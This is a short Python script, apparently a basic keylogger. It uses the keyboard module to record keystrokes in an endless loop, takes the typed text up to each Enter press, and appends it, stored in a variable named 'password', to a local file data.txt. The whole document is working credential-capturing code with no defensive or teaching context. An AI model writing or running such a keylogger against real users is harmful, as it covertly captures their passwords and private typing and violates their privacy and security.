# Importing the keyboard module which will acess the inputs from the keyboard
import keyboard

# Defining the text file name and path
path = "data.txt"

while True:
    with open(path, 'a') as data_file:
        
        # All key presses are recorded as a list into "events" and the record loop stops when the "enter" key is pressed
        events = keyboard.record('enter')
        password = list(keyboard.get_typed_strings(events))
        
        data_file.write('\n') # New line written before data is written
        data_file.write(password[0])
